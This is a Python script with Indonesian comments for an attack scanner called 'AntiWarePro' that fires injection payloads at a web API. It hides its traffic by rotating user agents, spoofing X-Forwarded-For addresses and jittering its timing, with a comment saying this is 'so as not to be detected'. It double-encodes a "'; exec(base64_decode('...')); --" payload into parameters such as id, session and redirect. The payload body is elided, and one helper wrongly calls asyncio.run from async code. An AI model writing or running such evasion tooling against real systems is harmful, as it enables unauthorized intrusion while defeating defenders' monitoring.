import asyncio
import aiohttp
import random
import time
from fake_useragent import UserAgent

class AntiWarePro:
    def __init__(self):
        self.ua = UserAgent()
        # Konfigurasi Adaptive Timing
        self.min_delay = 1.5  # Jeda minimum (detik)
        self.max_delay = 4.0  # Jeda maksimum (detik)
        self.request_count = 0
        self.burst_limit = 5  # Setelah 5 request, lakukan istirahat panjang

    async def adaptive_sleep(self):
        """Menghasilkan jeda acak untuk meniru perilaku manusia (Jittering)"""
        self.request_count += 1
        
        # Jeda antar request biasa
        current_delay = random.uniform(self.min_delay, self.max_delay)
        
        # Mekanisme 'Istirahat Panjang' jika sudah melakukan burst request
        if self.request_count % self.burst_limit == 0:
            extra_rest = random.uniform(5, 10)
            print(f"[#] Adaptive Timing: Melakukan istirahat panjang {extra_rest:.2f}s agar tidak terdeteksi...")
            await asyncio.sleep(extra_rest)
        else:
            await asyncio.sleep(current_delay)

    def get_obfuscated_payload(self, payload):
        """Advanced Bypass: Menggabungkan beberapa teknik encoding"""
        # Contoh: Case flipping + Double URL Encoding
        obfuscated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        return asyncio.run(self.apply_double_encode(obfuscated))

    async def apply_double_encode(self, text):
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(text))

    async def secure_request(self, session, url):
        """Eksekusi request dengan perlindungan berlapis"""
        headers = {
            'User-Agent': self.ua.random,
            'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
            'Accept-Encoding': 'gzip, deflate, br'
        }

        # Terapkan Adaptive Timing sebelum request dikirim
        await self.adaptive_sleep()

        try:
            async with session.get(url, headers=headers, timeout=15) as resp:
                status_color = "\033[92m" if resp.status == 200 else "\033[91m"
                print(f"[*] Request {self.request_count} | Status: {status_color}{resp.status}\033[0m | Target: {url}")
                return await resp.text()
        except Exception as e:
            print(f"[!] Request Error: {e}")
            return None

    async def run_research(self, base_url, params):
        connector = aiohttp.TCPConnector(limit=1, ssl=False) # Limit=1 agar request benar-benar sekuensial & aman
        async with aiohttp.ClientSession(connector=connector) as session:
            for p in params:
                # Simulasi exploit payload
                payload = f"'; exec(base64_decode('...')); --"
                encoded_p = await self.apply_double_encode(payload)
                
                target = f"{base_url}?{p}={encoded_p}"
                await self.secure_request(session, target)

# --- Main ---
if __name__ == "__main__":
    scanner = AntiWarePro()
    target = "https://example-enterprise.com/v1/api"
    params_to_test = ["id", "user", "session", "callback", "redirect"]
    
    asyncio.run(scanner.run_research(target, params_to_test))
